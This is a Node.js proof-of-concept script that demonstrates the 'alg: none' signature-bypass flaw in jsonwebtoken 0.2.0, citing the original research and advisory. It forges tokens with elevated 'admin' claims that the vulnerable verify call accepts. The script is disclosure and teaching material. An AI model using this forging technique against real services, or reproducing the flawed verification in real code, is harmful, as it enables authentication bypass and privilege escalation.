// Original research publication:
// https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
//
// Depdency installation command:
// npm i jsonwebtoken@0.2.0
// 
// Node security advisory:
// https://nodesecurity.io/advisories/88

const jwt = require('jsonwebtoken');
const secretKey = 'this is a secret key';

// This represents a normal, server signed token issued to the client, perhaps upon successful
// authentication.
var originalToken = jwt.sign({ loggedInAs: 'user', iat: 1422779638 }, secretKey, { algorithm: 'HS256' });

// This represents a normal server side verification of a token sent to the server by the client.
jwt.verify(originalToken, secretKey, function(err, result) {
  console.log('this should pass', result, err);
});

// This represents an abnormally signed token, perhaps created as an attempt to forge a token.
var diffKeyToken = jwt.sign({ loggedInAs: 'user', iat: 1422779638 }, 'different than secret key', { algorithm: 'HS256' });

// This should fail because the key supplied when signing the token doesn't match the secret key
// which only the server knows.
jwt.verify(diffKeyToken, secretKey, function(err, result) {
  console.log('this should fail', result, err);
});

// Here we set the algorithm to 'none', and supply a key which does not match the secret server side
// key. This token could be created somewhere other than the server (where the secret lives) because 
// the secret key doesn't need to be used in order to facilitate a successful verify operation.
// Also, the privilege of the token has been elevated from 'user' to 'admin' to demonstrate how
// this attack might be useful in a practical context.
var noneToken = jwt.sign({ loggedInAs: 'admin', iat: 1422779638 }, '', { algorithm: 'none' });

// Even though the key doesn't match, because the algorithm is set to none, the result of the verify
// operation is success.  This is the vulnerability.
jwt.verify(noneToken, secretKey, function(err, result) {
  console.log('this should fail but will not because of the bug', result, err);
});

// An extraneous case, which explicitly demonstrates that any key can be used with the 'none'
// algorithm and will result in a successful verification.
var noneTokenDiff = jwt.sign({ loggedInAs: 'admin', iat: 1422779638 }, 'different than secret key', { algorithm: 'none' });

// This should not pass, but does because the 'none' algorithm is set.
jwt.verify(noneTokenDiff, secretKey, function(err, result) {
  console.log('this should also fail but will not because of the bug', result, err);
});